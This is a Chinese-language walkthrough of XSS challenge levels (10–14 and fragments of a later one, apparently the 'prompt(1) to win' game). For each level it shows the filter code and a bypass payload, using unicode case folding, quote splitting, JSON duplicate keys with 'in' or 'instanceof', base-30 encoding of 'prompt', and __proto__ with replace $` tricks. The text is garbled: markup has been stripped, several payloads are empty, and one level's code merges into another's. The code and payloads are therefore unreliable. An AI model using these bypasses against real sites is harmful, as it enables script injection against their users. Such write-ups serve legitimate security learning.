        // sample input: you shall not pass! => YOU SHALL NOT PASS!
        return '' + input + '';
    }
本题会将输入的内容全部转换为大写，而且还会将``转换为``
toUpperCase()：把字符串转换为大写，（而且还可以转换一些unicode字符）
本题将 ſ 转换为S,这里的ſ字符应该是某个国家的unicode字符，转换后恰好对应s，因此可以完成绕过。
**payload：``**
* * *
## 第10关
    function escape(input) {
        // (╯°□°）╯︵ ┻━┻
        input = encodeURIComponent(input).replace(/prompt/g, 'alert');
        // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
        input = input.replace(/'/g, '');
        // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
        return ' ';
    }
本题将prompt替换为alert，但是同时也将‘替换为空，可以组合绕过一下
    payload:prom'pt(1)
* * *
## 第11关
    function escape(input) {
        // name should not contain special characters
        var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');
        // data to be parsed as JSON
        var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
        // directly "parse" data in script context
        return '                                \n\
     ';
    }
本题正则过滤了大量的符号，基本思路是利用js的一个特性进行绕过。可以通过下面这个例子来理解
    >var array={"n":1,"n":2}
    >array.n
    >2
通过上面的例子我们知道，在js中，键名相同，输出后值是后面的变量的值，基本的构造思路是构造 ","message":"prompt(1)"
为了绕过正则，需要利用js的一个神奇的语法。
在js中,（prompt(1)）instaneof"1"和（prompt(1)）in"1"是可以成功弹窗的（可以自己在console试一下），其中双引号里面的1可以是任何字符，这里的in或者instanceof是运算符，所以可以有这样的语法结构。
**payload:"(prompt(1))instanceof" 或"(prompt(1))in"**
* * *
## 第12关
    function escape(input) {
        // in Soviet Russia...
        input = encodeURIComponent(input).replace(/'/g, '');
        // table flips you!
        input = input.replace(/prompt/g, 'alert');
        // ノ┬─┬ノ ︵ ( \o°o)\
        return ' ';
    }
本题依旧是将prompt替换为alert，但是和第10关的代码顺序稍许不同，可以用toString进行绕过
parseInt(string,radix):解析一个字符串并返回一个整数
toString():把一个逻辑值转换为字符串并返回结果
基本思路便是将prompt进行转换，但是注意其中字母最大的是t，也就是说至少要30进制才能完全转换
    > parseInt("prompt",30)
      > 630038579
      > (630038579).toString(30)
      >"prompt"
如果使用30进制一下，例如29进制，就会出现字符转回缺失
    > parseInt("prompt",29)
     > 18361375
     > (18361375).toString(29)
     > "promp"
**payload:eval((630038579).toString(30))(1)**
* * *
## 第13关
    function escape(input) {
        // extend method from Underscore library
        // _.extend(destination, *sources) 
        function extend(obj) {
            var source, prop;
            for (var i = 1, length = arguments.length; i '.replace('{{source}}', source);
        } catch (e) {
            return 'Invalid image data.';
        }
    }
本题需要了解一个js的proto属性
proto：每个对象都会在内部初始化这个属性，当访问对象的某个属性时，如果不存在这个属性，便会去proto里寻找这个属性。
可以在console做个实验
    >test={"r":1,"__proto__":{"r":2}}
    Object { r: 1 }
    >test.r
    1
    >delete test.r
    true
    >test.r
    2
根据这样的特点，我们可以初步构造payload：{"source":"0"," **proto**
":{"source":"onerror=prompt(1)"}}  
但是并不能绕过题目的过滤，于是便要利用replace的一个特性
    >'11223344'.replace('2',"test")
    "11test23344"
    >'11223344'.replace('2',"$`test")
    "1111test23344"
    >'11223344'.replace('2',"$'test")
    "1123344test23344"
    >'11223344'.replace('2',"$&test")
    "112test23344"
老实说这一段我参考别人的wp做了实验后还是不能很好的理解为什么replace会有这些特殊的参数用法，只能暂时先记住这些用法所构造的字符串的规律。因此针对本题就可以构造出我们的payload了
**payload： {"source":"'"," **proto** ": {"source":"$`onerror=prompt(1)>"}}**
* * *
## 第14关
    function escape(input) {
        // I expect this one will have other solutions, so be creative :)
        // mspaint makes all file names in all-caps :(
        // too lazy to convert them back in lower case
        // sample input: prompt.jpg => PROMPT.JPG
        input = input.toUpperCase();
        // only allows images loaded from own host or data URI scheme
        input = input.replace(/\/\/|\w+:/g, 'data:');
        // miscellaneous filtering
        input = input.replace(/[\\&+%\s]|vbs/gi, '_');
        return '';
    }
本题的输入都为大写字母，并且把//和任意字母替换成data：，看来是要构造data
URI格式的payload，后面还将\&和空白字符都替换了，所以不能使用十六进制字符。
正常的data URI应该是类似下面这样的
    test
其中base64解码出来的结果是``  
但是本题的输入全被转换成大写的，正常的payload是无法被解析，老实说这题的官方答案都无法成功执行，看解释的大概意思我猜是火狐浏览器是可以支持大写的base64的解析，然后精心构造一个大写的base64编码，解码后恰好可以达到上面的效果，便能够成功执行，但是我实验后是失败的，我看其他人的wp也都说失败了，emmm不是很清楚具体原因是什么。
**参考payload："
>';
        }).join('\n');
    }
本题跟之前利用#和换行符绕过的思路类似，只不过本题需要再多加个svg以及用进行注释
**payload：" >**
* * *
## 结束语
由于本人水平有限，如果有dalao发现文章有纰漏，还望能够指出，谢谢。